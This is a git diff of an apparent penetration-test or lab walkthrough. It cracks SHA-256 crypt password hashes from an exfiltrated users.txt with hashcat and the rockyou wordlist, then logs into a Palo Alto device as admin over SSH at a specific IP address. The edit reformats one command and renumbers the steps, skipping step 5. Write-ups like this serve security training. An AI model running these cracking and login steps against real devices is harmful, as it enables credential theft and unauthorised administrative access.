@@ -302,11 +302,15 @@ In this section, we will leverage the exfiltrated users.txt file that was pulled
    Once you have found the file, change to the directory where it's located (unless you are already there): `cd /path/to/directory/with/users.txt`
 2. Once you are in the correct directory, run the following command to create a new file containing only the valid SHA-256 hashes and usernames from the users.txt file: `grep -E '^\S+:\$5\$' users.txt > valid_hashes.txt`
    This command filters the content of users.txt and extracts the lines that start with valid SHA-256 hashes ($5$), saving them to a new file called valid_hashes.txt.
-3. Now that you have the valid hashes in valid_hashes.txt, you can begin cracking the passwords offline using Hashcat. Run the following command to start the cracking process with the rockyou.txt wordlist: `hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt`
+3. Now that you have the valid hashes in valid_hashes.txt, you can begin cracking the passwords offline using Hashcat. Run the following command to start the cracking process with the rockyou.txt wordlist:
+
+```bash
+hashcat -m 7400 -a 0 valid_hashes.txt /usr/share/wordlists/rockyou.txt
+```
    This will use Hashcat to attempt cracking the passwords. The -m 7400 option specifies the SHA-256 crypt format, and the -a 0 option sets the attack mode to dictionary-based.
    -While Hashcat is running, you can check the status of the cracking process by using the following command: `hashcat --status`
-4. Once Hashcat has completed the cracking process, you can view the cracked passwords by running: `hashcat --show valid_hashes.txt`
-5. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH: `ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38`
+6. Once Hashcat has completed the cracking process, you can view the cracked passwords by running: `hashcat --show valid_hashes.txt`
+7. Using the cracked administrator credentials, you can now log into the Palo Alto device via SSH: `ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38`
    When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.
 
 ![image](https://github.com/user-attachments/assets/66e07739-2790-485b-9154-57c3ca5a34c8)
